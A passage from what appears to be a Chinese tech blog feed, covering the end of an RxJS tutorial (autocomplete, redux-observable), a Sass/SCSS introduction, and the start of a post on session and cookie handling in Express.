function sendRequest () &#123;  return fetch(&#x27;https://jsonplaceholder.typicode.com/posts/1&#x27;).then(res =&gt; res.json())&#125;  Rx.Observable.fromEvent(document.querySelector(&#x27;input[name=send]&#x27;), &#x27;click&#x27;)  .flatMap(e =&gt; Rx.Observable.fromPromise(sendRequest()))  .subscribe(value =&gt; &#123;    console.log(value)  &#125;)

這邊用flatMap的原因跟剛才的畫圖範例一樣，我們要在按下按鈕時，把原本的資料流轉換成新的資料流，如果只用map的話，會變成一個二維的 Observable，所以必須要用flatten把它壓平。
你可以試試看把flatMap改成map，你最後 subscribe 得到的值就會是一堆 Observable 而不是你想要的資料。
知道怎麼用 Rx 來處理 API 之後，就可以來做一個經典範例了：AutoComplete。
我在做這個範例的時候有極大部分參考30 天精通 RxJS(19): 實務範例 - 簡易 Auto Complete 實作、Reactive Programming 簡介與教學(以 RxJS 為例)以及构建流式应用—RxJS详解，再次感謝這三篇文章。

為了要讓大家能夠體會 Reactive Programming 跟一般的有什麼不一樣，我們先用老方法做出這個 Auto Complete 的功能吧！
先來寫一下最底層的兩個函式，負責抓資料的以及 render 建議清單的，我們使用維基百科的 API 來當作範例：
function searchWikipedia (term) &#123;    return $.ajax(&#123;        url: &#x27;http://en.wikipedia.org/w/api.php&#x27;,        dataType: &#x27;jsonp&#x27;,        data: &#123;            action: &#x27;opensearch&#x27;,            format: &#x27;json&#x27;,            search: term        &#125;    &#125;).promise();&#125;  function renderList (list) &#123;  $(&#x27;.auto-complete__list&#x27;).empty();  $(&#x27;.auto-complete__list&#x27;).append(list.map(item =&gt; &#x27;&lt;li&gt;&#x27; + item + &#x27;&lt;/li&gt;&#x27;))&#125;

這邊要注意的一個點是維基百科回傳的資料會是一個陣列，格式如下：
[你輸入的關鍵字, 關鍵字清單, 每個關鍵字的介紹, 每個關鍵字的連結]  // 範例：[  &quot;dd&quot;,  [&quot;Dd&quot;, &quot;DDR3 SDRAM&quot;, &quot;DD tank&quot;],  [&quot;&quot;, &quot;Double data rate type three SDRAM (DDR3 SDRAM)&quot;, &quot;DD or Duplex Drive tanks&quot;],  [https://en.wikipedia.org/wiki/Dd&quot;, &quot;https://en.wikipedia.org/wiki/DDR3_SDRAM&quot;, &quot;...略&quot;]]

在我們的簡單示範中，只需要取 index 為 1 的那個關鍵字清單就好了。而renderList這個 function 則是傳進一個陣列，就會把陣列內容轉成li顯示出來。
有了這兩個最基礎的 function 之後，就可以很輕易地完成 Auto Complete 的功能：
document.querySelector(&#x27;.auto-complete input&#x27;).addEventListener(&#x27;input&#x27;, (e) =&gt; &#123;  searchWikipedia(e.target.value).then((data) =&gt; &#123;    renderList(data[1])  &#125;)&#125;)

程式碼應該很好懂，就是每次按下輸入東西的時候去 call api，把回傳的資料餵給renderList去渲染。
最基本的功能完成了，我們要來做一點優化，因為這樣子的實作其實是有一些問題的。
第一個問題，現在只要每打一個字就會送出一個 request，可是這樣做其實有點浪費，因為使用者可能快速的輸入了：java想要找相關的資料，他根本不在乎j、ja、jav這三個 request。
要怎麼做呢？我們就改寫成如果 250ms 裡面沒有再輸入新的東西才發送 request 就好，就可以避免這種多餘的浪費。
這種技巧稱作debounce，實作上也很簡單，就是利用setTimeout跟clearTimeout。
var timer = null;document.querySelector(&#x27;.auto-complete input&#x27;).addEventListener(&#x27;input&#x27;, (e) =&gt; &#123;  if (timer) &#123;    clearTimeout(timer);  &#125;  timer = setTimeout(() =&gt; &#123;    searchWikipedia(e.target.value).then((data) =&gt; &#123;      renderList(data[1])    &#125;)  &#125;, 250)&#125;)

在 input 事件被觸發之後，我們不直接做事情，而是設置了一個 250ms 過後會觸發的 timer，如果 250ms 內 input 再次被觸發的話，我們就把上次的 timer 清掉，再重新設置一個。
如此一來，就可以保證使用者如果在短時間內不斷輸入文字的話，不會送出相對應的 request，而是會等到最後一個字打完之後的 250 ms 才發出 request。
解決了第一個問題之後，還有一個潛在的問題需要解決。
假設我現在輸入a，接著刪除然後再輸入b，所以第一個 request 會是a的結果，第二個 request 會是b的結果。我們假設 server 出了一點問題，所以第二個的 response 反而比第一個還先到達（可能b的搜尋結果有 cache 但是a沒有），這時候就會先顯示b的內容，等到第一個 response 回來時，再顯示a的內容。
可是這樣 UI 就有問題了，我明明輸入的是b，怎麼 auto complete 的推薦關鍵字是a開頭？
所以我們必須要做個檢查，檢查返回的資料跟我現在輸入的資料是不是一致，如果一致的話才 render：
var timer = null;document.querySelector(&#x27;.auto-complete input&#x27;).addEventListener(&#x27;input&#x27;, (e) =&gt; &#123;  if (timer) &#123;    clearTimeout(timer);  &#125;  timer = setTimeout(() =&gt; &#123;    searchWikipedia(e.target.value).then((data) =&gt; &#123;      if (data[0] === document.querySelector(&#x27;.auto-complete input&#x27;).value) &#123;        renderList(data[1])      &#125;    &#125;)  &#125;, 250)&#125;)

到這裡應該就差不多了，該有的功能都有了。
接著，讓我們來挑戰用 RxJS 實作吧！
首先，先從簡單版的開始做，就是不包含 debounce 跟上面 API 順序問題的實作，監聽 input 事件轉換成 request，然後用flatMap壓平，其實就跟上面的流程差不多：
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete input&#x27;), &#x27;input&#x27;)  .map(e =&gt; e.target.value)  .flatMap(value =&gt; &#123;    return Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1])  &#125;)  .subscribe(value =&gt; &#123;    renderList(value);  &#125;)

這邊用了兩個map，一個是把e轉成e.target.value，一個是把傳回來的結果轉成res[1]，因為我們只需要關鍵字列表，其他的東西其實都不用。
那要如何實作debounce的功能呢？
RxJS 已經幫你實作好了，所以你只要加上.debounceTime(250)就好了，就是這麼簡單。
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete input&#x27;), &#x27;input&#x27;)  .debounceTime(250)  .map(e =&gt; e.target.value)  .flatMap(value =&gt; &#123;    return Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1])  &#125;)  .subscribe(value =&gt; &#123;    renderList(value);  &#125;)

還有最後一個問題要解決，那就是剛才提到的 request 的順序問題。
Observable 有一個不同的解法，我來解釋給大家聽聽。
其實除了flatMap以外，還有另外一種方式叫做switchMap，他們的差別在於要怎麼把 Observable 給壓平。前者我們之前介紹過了，就是會把每一個二維的 Observable 都壓平，並且「每一個都執行」。
而switchMap的差別在於，他永遠只會處理最後一個 Observable。拿我們的例子來說，假設第一個 request 還沒回來的時候，第二個 request 就發出去了，那我們的 Observable 就只會處理第二個 request，而不管第一個。
第一個還是會發送，還是會接收到資料，只是接收到資料以後不會再把這個資料 emit 到 Observable 上面，意思就是根本沒人理這個資料了。
可以看一下簡陋的圖解，flatMap每一個 promise resolve 之後的資料都會被發送到我們的 Observable 上面：

而switchMap只會處理最後一個：

所以我們只要把flatMap改成switchMap，就可以永遠只關注最後一個發送的 request，不用去管 request 傳回來的順序，因為前面的 request 都跟這個 Observable 無關了。
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete input&#x27;), &#x27;input&#x27;)  .debounceTime(250)  .map(e =&gt; e.target.value)  .switchMap(value =&gt; &#123;    return Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1])  &#125;)  .subscribe(value =&gt; &#123;    renderList(value);  &#125;)

做到這邊，就跟剛剛實作的功能一模一樣了。
但其實還有地方可以改進，我們來做個小小的加強好了。現在的話當我輸入abc，會出現abc的相關關鍵字，接著我把abc全部刪掉，讓 input 變成空白，會發現 API 這時候回傳一個錯誤：The &quot;search&quot; parameter must be set.。
因此，我們可以在 input 是空的時候，不發送 request，只回傳一個空陣列，而回傳空陣列這件事情可以用Rx.Observable.of([])來完成，這樣會創造一個會發送空陣列的 Observable：
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete input&#x27;), &#x27;input&#x27;)  .debounceTime(250)  .map(e =&gt; e.target.value)  .switchMap(value =&gt; &#123;    return value.length &lt; 1 ? Rx.Observable.of([]) : Rx.Observable.from(searchWikipedia(value)).map(res =&gt; res[1])  &#125;)  .subscribe(value =&gt; &#123;    renderList(value);  &#125;)

還有一個點擊關鍵字清單之後把文字設定成關鍵字的功能，在這邊就不示範給大家看了，但其實就是再創造一個 Observable 去監聽點擊事件，點到的時候就設定文字並且把關鍵字清單給清掉。
我直接附上參考程式碼：
Rx.Observable  .fromEvent(document.querySelector(&#x27;.auto-complete__list&#x27;), &#x27;click&#x27;)  .filter(e =&gt; e.target.matches(&#x27;li&#x27;))  .map(e =&gt; e.target.innerHTML)  .subscribe(value =&gt; &#123;    document.querySelector(&#x27;.auto-complete input&#x27;).value = value;    renderList([])  &#125;)

雖然我只介紹了最基本的操作，但 RxJS 的強大之處就在於除了這些，你甚至還有retry可以用，只要輕鬆加上這個，就能夠有自動重試的功能。
相關的應用場景還有很多，只要是跟 API 有關連的幾乎都可以用 RxJS 很優雅的解決。
React + Redux 的非同步解決方案：redux-observable這是我們今天的最後一個主題了，也是我開場所提到的。
React + Redux 這一套非常常見的組合，一直都有一個問題存在，那就是沒有規範非同步行為（例如說 API）到底應該怎麼處理。而開源社群也有許多不同的解決方案，例如說 redux-thunk、redux-promise、redux-saga 等等。
我們前面講了這麼多東西，舉了這麼多範例，就是要證明給大家看 Reactive programming 很適合拿來解決複雜的非同步問題。因此，Netflix 就開源了這套redux-observable，用 RxJS 來處理非同步行為。
在瞭解 RxJS 之後，可以很輕鬆的理解redux-observable的原理。
在 redux 的應用裡面，所有的 action 都會通過 middleware，你可以在這邊對 action 做任何處理。或者我們也可以把 action 看做是一個 Observable，例如說：
// 範例而已Rx.Observable.from(actionStreams)  .subscribe(action =&gt; &#123;    console.log(action.type, action.payload)  &#125;)

有了這個以後，我們就可以做一些很有趣的事情，例如說偵測到某個 action 的時候，我們就發送 request，並且把 response 放進另外一個 action 裡面送出去。
Rx.Observable.from(actionStreams)  .filter(action =&gt; action.type === &#x27;GET_USER_INFO&#x27;)  .switchMap(    action =&gt; Rx.Observable.from(API.getUserInfo(action.payload.userId))  )  .subscribe(userInfo =&gt; &#123;    dispatch(&#123;      type: &#x27;SET_USER_INFO&#x27;,      payload: userInfo    &#125;)  &#125;)

上面就是一個簡單的例子，但其實redux-observable已經幫我們處理掉很多東西了，所以我們只要記得一個概念：

action in, action out

redux-observable 是一個 middleware，你可以在裡面加上很多epic，每一個epic就是一個 Observable，你可以監聽某一個指定的 action，做一些處理，再轉成另外一個 action。
直接看程式碼會比較好懂：
import Actions from &#x27;./actions/user&#x27;;import ActionTypes from &#x27;./actionTypes/user&#x27;const getUserEpic = action$ =&gt;  action$.ofType(actionTypes.GET_USER)    .switchMap(      action =&gt; Rx.Observable.from(API.getUserInfo(action.payload.userId))    ).map(userInfo =&gt; Actions.setUsers(userInfo))

大概就是像這樣，我們監聽一個 action type（GET_USER），一接收到的時候就發送 request，並且把結果轉為setUsers這個 action，這就是所謂的 action in, action out。
這樣的好處是什麼？好處是明確制定了一個規範，當你的 component 需要資料的時候，就送出一個 get 的 action，這個 action 經過 middleware 的時候會觸發 epic，epic 發 request 給 server 拿資料，轉成另外一個 set 的 action，經過 reducer 設定資料以後更新到 component 的 props。
可以看這張流程圖：

總之呢，epic就是一個 Observable，你只要確保你最後回傳的東西是一個 action 就好，那個 action 就會被送到 reducer 去。
礙於篇幅的關係，今天對於redux-observable只是概念性的帶過去而已，沒有時間好好示範，之後再來找個時間好好寫一下redux-observable的實戰應用。
結論從一開始的陣列講到 Observable，講到畫圖的範例再講到經典的 Auto Complete，最後還講了redux-observable，這一路的過程中，希望大家有體會到 Observable 在處理非同步行為的強大之處以及簡潔。
這篇的目的是希望能讓大家理解 Observable 大概在做什麼，以及介紹一些簡單的應用場景，希望能提供一篇簡單易懂的中文入門文章，讓更多人能體會到 Observable 的威力。
喜歡這篇的話可以幫忙分享出去，發現哪邊有寫錯也歡迎留言指正，感謝。
參考資料：
30 天精通 RxJS (01)：認識 RxJSReactive Programming 簡介與教學(以 RxJS 為例)The introduction to Reactive Programming you’ve been missing构建流式应用—RxJS详解Epic Middleware in ReduxCombining multiple Http streams with RxJS Observables in Angular2
影片：Netflix JavaScript Talks - RxJS + Redux + React &#x3D; Amazing!RxJS Quick Start with Practical ExamplesRxJS Observables Crash CourseNetflix JavaScript Talks - RxJS Version 5RxJS 5 Thinking Reactively | Ben Lesh
關於作者：@huli 野生工程師，相信分享與交流能讓世界變得更美好
]]></content>
      <tags>
        <tag>rxjs</tag>
      </tags>
  </entry>
  <entry>
    <title>Sass/SCSS 簡明入門教學</title>
    <url>/2017/06/30/sass-scss-tutorial-introduction/</url>
    <content><![CDATA[
Sass&#x2F;SCSS 簡介
Sass is an extension of CSS3, adding nested rules, variables, mixins, selector inheritance, and more. It’s translated to well-formatted, standard CSS using the command line tool or a web-framework plugin.

Sass（Syntactically Awesome StyleSheets）是一種 CSS 的擴充，是為 CSS 的超集合（透過編譯會 compiled 成傳統 CSS，讓瀏覽器可以閱讀）。使用 Sass 的出現是為了解決在大型專案時傳統 CSS 會遇到的重複、可維護性差等問題（新增了 nested rules, variables, mixins, selector inheritance 等特性）。讓開發者可以撰寫簡潔、富語意（expressive）、重複性佳（reusable）、可維護性佳和可延展性佳的 CSS 程式碼。gem install sass
Sass 的語法分為新的 SCSS (Sassy CSS、Sass 3，檔案名稱為 *.scss) 和舊的 SASS（向 Haml取經，具備不使用大括弧格式、使用縮排，不能直接使用 CSS 語法、學習曲線較高等特性，檔案名稱為 *.sass）。由於新的 SCSS 語法是 CSS3 的超集合，所以傳統的 CSS3 檔案就算直接複製過來也不會出錯，學習曲線相對較緩，因此我們將使用 SCSS 語法。 
關於兩者比較的補充可以參考這篇文章 What’s the difference between SCSS and Sass?
SASS 初體驗在開始介紹 SASS 特性之前，我們先來學習如何將 Sass 轉譯成 CSS。
首先，先按照官網先行安裝 Sass，接著在專案資料夾建立一個 main.scss 檔案，檔案內容如下：
// 引用@import url(https://fonts.googleapis.com/css?family=Pacifico);//Add variables here:h1 &#123;  font-family: Roboto, sans-serif;  text-align: center;&#125;.banner &#123;  font-family: &#x27;Pacifico&#x27;, cursive;  height: 400px;  background-image: url(&quot;lemonade.jpg&quot;);&#125;.container &#123;  text-align: center;  font-family: &#x27;Pacifico&#x27;, cursive;&#125;

在終端機下以下指令進行轉譯：
// sass 指令 欲轉譯檔案 輸出的檔案sass main.scss main.css

此時你就會看到資料夾中多了 main.css 和 main.css.map 兩個檔案，前者是轉譯過後的 CSS 檔案，後者是方便使用瀏覽器除錯工具除錯時連結原檔案和轉譯檔案，方便除錯。

Variables：變數可以用來儲存值，方便重複利用
 有些時候 Variables，這時候若能使用變數儲存重複使用的值可以增加重用性。在 Sass 中我們使用 $ 來表示變數，變數的資料型態可以是 Numbers（可以有單位或無單位）、Strings、Booleans、null 值（視為空值），甚至可以使用 Lists、Maps 來。
 變數的使用：
 $translucent-white: rgba(255,255,255,0.3);p &#123;	background-color: $translucent-white;&#125;

 Lists 可以空格或加逗號分隔屬性值：
 $font-style-2: Helvetica, Arial, sans-serif;$standard-border: 4px solid black;p &#123;	border: $standard-border;&#125;// maps key:value$font-style-2: (key1: value1, key2: value2);	

Nesting：降低父元素重複性
 轉譯前：
 .parent &#123;  color: blue;  .child &#123;    font-size: 12px;  &#125;&#125;

 轉譯後：
 .parent &#123;  color: blue;&#125;.parent .child &#123;    font-size: 12px;&#125;

 在 Nesting 中不僅只有 child selectors 可以使用，還可以使用在相同的 Properties 上：
 .parent &#123;  font : &#123;    family: Roboto, sans-serif;    size: 12px;    decoration: none;  &#125;&#125;

 轉譯後：
 .parent &#123;  font-family: Roboto, sans-serif;  font-size: 12px;  font-decoration: none;&#125;
Mixins：降低 pseudo 元素撰寫的重複性，如：::before、::after、:hover，在 Sass 中使用 &amp; 代表父元素
 轉譯前：
 .notecard&#123;   &amp;:hover&#123;      @include transform (rotatey(-180deg));      &#125;  &#125;

 轉譯後：
 .notecard:hover &#123;  transform: rotatey(-180deg);&#125;

 重用群組的 CSS，例如跨瀏覽器的 prefix，使用 @include 加入群組：
 轉譯前：
 @mixin backface-visibility &#123;  backface-visibility: hidden;  -webkit-backface-visibility: hidden;  -moz-backface-visibility: hidden;  -ms-backface-visibility: hidden;  -o-backface-visibility: hidden;&#125;.notecard &#123;  .front, .back &#123;    width: 100%;    height: 100%;    position: absolute;    @include backface_visibility;  &#125;&#125;

 轉譯後：
 .notecard .front, .notecard .back &#123;  width: 100%;  height: 100%;  position: absolute;  backface-visibility: hidden;  -webkit-backface-visibility: hidden;   -moz-backface-visibility: hidden;  -ms-backface-visibility: hidden;  -o-backface-visibility: hidden;&#125;

 @mixin 也可以透過 @include 使用參數，也可以使用預設值：
 @mixin backface-visibility($visibility:hidden) &#123; //Add an argument  backface-visibility: $visibility;  -webkit-backface-visibility: $visibility;  -moz-backface-visibility: $visibility;  -ms-backface-visibility: $visibility;  -o-backface-visibility: $visibility;&#125;.front, .back &#123;    @include backface-visibility(hidden);&#125;

 有時我們也需要處理參數複雜的情形，此時可以使用 Lists、Maps 資料型態當輔助：
 @mixin stripes($direction, $width-percent, $stripe-color, $stripe-background: #FFF) &#123;  background: repeating-linear-gradient(    $direction,    $stripe-background,    $stripe-background ($width-percent - 1),    $stripe-color 1%,    $stripe-background $width-percent  );&#125;

 使用 Maps 資料格式存欲傳入變數：
 $college-ruled-style: (     direction: to bottom,    width-percent: 15%,    stripe-color: blue,    stripe-background: white);

 變數使用 ... 進行傳遞：
 .definition &#123;      width: 100%;      height: 100%;      @include stripes($college-ruled-style...); &#125;

 還有種情況是參數傳入當作字串（String interpolation）：
 轉譯前：
 // 使用 #&#123;$file&#125; 接收@mixin photo-content($file) &#123;  content: url(#&#123;$file&#125;.jpg); //string interpolation  object-fit: cover;&#125;.photo &#123;   @include photo-content(&#x27;titanosaur&#x27;);  width: 60%;  margin: 0px auto; &#125;

 轉譯後：
 .photo &#123;   content: url(titanosaur.jpg);  width: 60%;  margin: 0px auto; &#125;

 更可以搭配 Nesting 使用：
 @mixin hover-color($color) &#123;  		&amp;:hover &#123;   		color: $color;   	&#125;  	&#125;  	.word &#123;   	@include hover-color(red);  	&#125;

Functions 
 在 Sass 內建一些好用 functions 可以簡單設定色相、漸層，例如：adjust-hue($color, $degrees)、fade-out：
 $lagoon-blue: fade-out(#62fdca, 0.5);

 更多內建 Functions 可以參考這邊

Operations：透過加減乘除和取餘數等運算子可以方便運算所需的屬性值
 顏色加法：
 $color: #010203 + #040506;/*	01 + 04 = 05	02 + 05 = 07	03 + 06 = 09	color: #050709;*/
 // 使用上需要注意：
 width: $variable/6; //divisionline-height: (600px)/9; //divisionmargin-left: 20-10 px/ 2; //divisionfont-size: 10px/8px; //not division

 也可以使用 @each 語法迭代 list 內容：
 $list: (orange, purple, teal);@each $item in $list &#123;  .#&#123;$item&#125; &#123;    background: $item;  &#125;&#125;

 使用 @for 迭代，並加入條件判斷：
 @for $i from 1 through $total &#123;  .ray:nth-child(#&#123;$i&#125;) &#123;	background: adjust-hue(blue, $i * $step);	// 	width: if($i % 2 == 0, 300px, 350px); 		margin-left: if($i % 2 == 0, 0px, 50px);  &#125;&#125;

@include 引用：可以引入其他 Sass、SCSS 檔案：
 我們通常使用 Partials 去處理特定功能，方便管理和維護。以下是引用 _variables.scss 檔案範例，其中檔名前的 _ 表示引用前要先 compile：
 @import &quot;variables&quot;;
@extend 共用：
 編譯前：
 .lemonade &#123;  border: 1px yellow;  background-color: #fdd;&#125;.strawberry &#123;  @extend .lemonade;  border-color: pink;&#125;

 轉譯後：
 .lemonade, .strawberry &#123;  border: 1px yellow;  background-color: #fdd;&#125;.strawberry &#123;  @extend .lemonade;  border-color: pink;&#125;

 搭配 Placeholders 使用：
 轉譯前：
 a%drink &#123;	font-size: 2em;	background-color: $lemon-yellow;&#125;.lemonade &#123;	@extend %drink;	//more rules&#125;

 轉譯後
 a.lemonade &#123;   	font-size: 2em;   	background-color: $lemon-yellow;	&#125;.lemonade &#123; 		//more rules&#125;

@mixin 和 @extend 比較
 轉譯前：
 @mixin no-variable &#123;  font-size: 12px;  color: #FFF;  opacity: .9;&#125;%placeholder &#123;  font-size: 12px;  color: #FFF;  opacity: .9;&#125;span &#123;  @extend %placeholder;&#125;div &#123;  @extend %placeholder;&#125;p &#123;  @include no-variable;&#125;h1 &#123;  @include no-variable;&#125;

 轉譯後：
 span, div&#123;  font-size: 12px;  color: #FFF;  opacity: .9;&#125;p &#123;  font-size: 12px;  color: #FFF;  opacity: .9;  //rules specific to ps&#125;h1 &#123;  font-size: 12px;  color: #FFF;  opacity: .9;  //rules specific to ps&#125;

Sass 資料夾結構
 sass/	components/		_buttons.scss	helpers/		_variables.scss		_functions.scss		_mixins.scss	layout/		_grid.scss		_header.scss		_footer.scss	pages/		_home.scss		_contact.scss

總結以上就是 Sass&#x2F;SCSS 簡明入門教學，在這篇文章中我們大致上介紹了 Sass 使用語法。除了 Sass 外，目前市面上還有許多 CSS 的變形，包括語法較易學的 LESS、元件化思考的 CSS in JS、主要解決全域問題和模組引用的 CSS Modules，取經於 JavaScript Task Runner 的 PostCSS 、網格樣式表單 GSS 等，這些最終都是要解決傳統 CSS 維護不易、重用性低下等問題。事實上，有些人覺得使用 preprocessor 較好維護，有些人認為每次都要編譯很麻煩，至於要選擇哪一種 CSS preprocessor 或是根本不使用，取決於團隊的內部規範和討論。俗話說後端一天，前端一年，說不定現在選邊站的技術，下個月就不流行了呢。
延伸閱讀
Sass &amp; Susy教學手冊
learn-sass
CSS Modules 用法教程
如何從 SASS 無痛轉移到 POSTCSS
Using PostCSS Together with Sass, Stylus, or LESS
[心得] 什麼是 postcss?
聊聊 CSS 預處理器，LESS、Sass、Stylus 及 postCSS

關於作者：@kdchang 文藝型開發者，夢想是做出人們想用的產品和辦一所心目中理想的學校。A Starter &amp; Maker. JavaScript, Python &amp; Arduino&#x2F;Android lover.:) 
]]></content>
      <tags>
        <tag>LESS, SASS, SCSS, Sass, PossCSS, CSS, OOCSS, CSS in JS, CSS Modules</tag>
      </tags>
  </entry>
  <entry>
    <title>深入 Session 與 Cookie：Express、PHP 與 Rails 的實作</title>
    <url>/2019/09/07/session-and-cookie-implementation/</url>
    <content><![CDATA[前言這是一系列共三篇的文章，我稱之為 Session 與 Cookie 三部曲。系列文的目標是想要由淺入深來談談這個經典議題，從理解概念一直到理解實作方式。這是系列文的最後一篇，三篇的完整連結如下：

白話 Session 與 Cookie：從經營雜貨店開始
淺談 Session 與 Cookie：一起來讀 RFC
深入 Session 與 Cookie：Express、PHP 與 Rails 的實作


第一篇以白話的方式來談 Session 與 Cookie，全篇沒有談到太多技術名詞；第二篇直接去看 Cookie 的三份 RFC 來理解到底什麼是 Session，也補齊了一些 Cookie 相關的知識。而這一篇則是要深入 Session，一起帶大家看看三種不同的 Session 實作方式。
這三樣分別是 Node.js 的 Web 框架 Express、PHP 以及 Ruby on Rails。會挑選這三個是因為他們對於 Session 機制的實作都不同，是我覺得很適合拿來參考的對象。
好，接著就開始吧！
ExpressExpress 本身是個極度輕量的框架，有許多其他框架底下的基本功能，在這邊都要額外安裝 middleware 才能使用。
先來簡單介紹一下 middleware 的概念。在 Express 裡面，當收到一個 Request  之後就會轉交給相對應的 middleware 來做處理，處理完以後變成 Response 回傳回去。所以 Express 的本質其實就是一大堆 middleware。
用圖解釋的話會長這樣：

舉個例子好了，一段基本的程式碼會長這樣：
const express = require(&#x27;express&#x27;)const app = express()const port = 5001  // global 的 middlewareapp.use((req, res, next) =&gt; &#123;  req.greeting = &#x27;hello&#x27;  next()&#125;)  // 特定 route 的 middlewareapp.get(&#x27;/&#x27;, (req, res) =&gt; &#123;  res.end(req.greeting)&#125;)  app.listen(port, () =&gt; &#123;  console.log(`Example app listening on port $&#123;port&#125;!`)&#125;)

第一個 middleware 是 global 的，所以任何 request 都會先到達這個 middleware，而這邊可以對 req 或是 res 這兩個參數設置一些東西，最後呼叫 next 把控制權轉給下一個 middleware。
而下一個 middleware 就可以拿到前面的 middleware 處理過後的資訊，並且輸出內容。如果沒有呼叫 next，代表不想把控制權轉移給下個 middleware。
在 Express 裡面，管理 Session 的 middleware 是 express-session，範例程式碼長這樣（改寫自官網範例）：
const express = require(&#x27;express&#x27;)const session = require(&#x27;express-session&#x27;)  const app = express()const port = 5001  // 使用 session middlewareapp.use(session(&#123;  secret: &#x27;keyboard cat&#x27;&#125;))   app.get(&#x27;/&#x27;, function(req, res, next) &#123;    // 可以用 req.session 拿取存在 session 的值  // 這邊判斷有沒有 req.session.views  // 如果有的話就 +1，反之初始化成 1  // 所以 req.session 可讀也可寫  if (req.session.views) &#123;    req.session.views++    res.write(&#x27;views: &#x27; + req.session.views)    res.end()  &#125; else &#123;    req.session.views = 1    res.end(&#x27;welcome to the session demo. refresh!&#x27;)  &#125;&#125;)  app.listen(port, () =&gt; &#123;  console.log(`Example app listening on port $&#123;port&#125;!`)&#125;)

使用了 session middleware 以後，可以直接用 req.session.key 來存取你要的資訊，同一個變數可以寫入也可以讀取，跟 PHP 的 $_SESSION 有異曲同工之妙。
接著我們來看看 express-session 的程式碼吧！主要的程式碼都在 index.js 這個檔案，大概有快七百行，不太可能一行一行講解。
而且寫得好的 library，會花很多精力在向後相容以及資料合法性的檢查，這些都是一些比較瑣碎而且對於想要理解機制比較沒幫助的東西。
所以我會直接把程式碼稍微整理一下，去除掉比較不重要的部分並且重新組織程式碼，只挑出相關的段落。
我們會關注三個重點：

sessionID 如何產生
sessionID 儲存方式
session 資訊儲存方式

可以先來看產生 sessionID 的地方：
// get the session id generate functionvar generateId = opts.genid || generateSessionId  // generates the new sessionstore.generate = function(req)&#123;  req.sessionID = generateId(req);  req.session = new Session(req);  req.session.cookie = new Cookie(cookieOptions);    if (cookieOptions.secure === &#x27;auto&#x27;) &#123;    req.session.cookie.secure = issecure(req, trustProxy);  &#125;&#125;;  function generateSessionId(sess) &#123;  return uid(24);&#125;

express-session 的客製化程度很高，可以自己傳進去產生 sessionID 的函式。若是沒有傳，預設會使用 uid(24)，這邊的 uid 指的是 uid-safe 這個 library，會產生一個長度為 24 bytes 的隨機 ID。
文件上有特別說明這個長度：

Asynchronously create a UID with a specific byte length. Because base64 encoding is used underneath, this is not the string length. For example, to create a UID of length 24, you want a byte length of 18.

所以填入 24，最後產生出來的會是長度為 32 個字元的字串。
那這個 sessionID 是以什麼樣的形式存進 Cookie 的呢？
var cookie = require(&#x27;cookie&#x27;)var signature = require(&#x27;cookie-signature&#x27;)  // get the session cookie namevar name = opts.name || opts.key || &#x27;connect.sid&#x27;  // get the cookie signing secretvar secret = opts.secret  if (secret &amp;&amp; !Array.isArray(secret)) &#123;  secret = [secret];&#125;  // set-cookieonHeaders(res, function()&#123;    // set cookie  setcookie(res, name, req.sessionID, secrets[0], req.session.cookie.data);&#125;);  function setcookie(res, name, val, secret, options) &#123;  var signed = &#x27;s:&#x27; + signature.sign(val, secret);  var data = cookie.serialize(name, signed, options);    debug(&#x27;set-cookie %s&#x27;, data);    var prev = res.getHeader(&#x27;Set-Cookie&#x27;) || []  var header = Array.isArray(prev) ? prev.concat(data) : [prev, data];    res.setHeader(&#x27;Set-Cookie&#x27;, header)&#125;

存在 cookie 裡面的 sessionID 的 key 一樣可以自己指定，但預設會是 connect.sid，所以以後一看到這個 key 就知道這是 express-session 預設的 sessionID 名稱。
內容的部分比較特別一點，會以 s: 開頭，後面接上 signature.sign(sessionID, secret) 的結果。
這邊要再看到 cookie-signature 這個 library，底下是一個簡單範例：
var cookie = require(&#x27;cookie-signature&#x27;);  var val = cookie.sign(&#x27;hello&#x27;, &#x27;tobiiscool&#x27;);val.should.equal(&#x27;hello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI&#x27;);

這邊的 sign 到底做了什麼呢？原始碼很簡單，可以稍微看一下：
var crypto = require(&#x27;crypto&#x27;);  /** * Sign the given `val` with `secret`. * * @param &#123;String&#125; val * @param &#123;String&#125; secret * @return &#123;String&#125; * @api private */  exports.sign = function(val, secret)&#123;  if (&#x27;string&#x27; != typeof val) throw new TypeError(&quot;Cookie value must be provided as a string.&quot;);  if (&#x27;string&#x27; != typeof secret) throw new TypeError(&quot;Secret string must be provided.&quot;);  return val + &#x27;.&#x27; + crypto    .createHmac(&#x27;sha256&#x27;, secret)    .update(val)    .digest(&#x27;base64&#x27;)    .replace(/\=+$/, &#x27;&#x27;);&#125;;

就只是把你要 sign 的內容用 hmac-sha256 產生一個鑑別碼，並且加在字串後面而已，中間會用.來分割資料。
若是你不知道什麼是 hmac 的話我稍微提一下，簡單來說就是可以對一串訊息產生鑑別碼，目的是為了保持資料的完整性讓它不被竄改。你可以想成它就是訊息對應到的一組獨一無二的代碼，如果訊息被改掉了，代碼也會不一樣。
以上面的範例來說，hello 利用 tobiiscool 這個 secret，得到的結果為：DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI，於是完整字串就變為：hello.DGDUkGlIkCzPz+C0B064FNgHdEjox7ch8tOBGslZ5QI，前面是我的資料，後面是資料的鑑別碼。
如果有人想竄改資料，例如說把前面改成 hello2，那這個資料的鑑別碼就不會是後面那一串，我就知道有人篡改資料了。所以藉由這樣的方式來保持資料完整性，其實原理跟 JWT 是差不多的，你看得到資料但沒辦法改它，因為改了會被發現。
你可能會疑惑說：那我幹嘛不把整個 sessionID 加密就好？為什麼要多此一舉用這種方式？我自己猜測是因為原始資料其實不怕別人看，只是怕人改而已；若是原始資料是敏感資訊，會用加密的方式。但因為原始資料只是 sessionID 而已，被別人看到也沒什麼關係，只要保障資料完整性即可。而且加密需要的系統資源應該比這種訊息驗證還多，因此才採用這種方式。
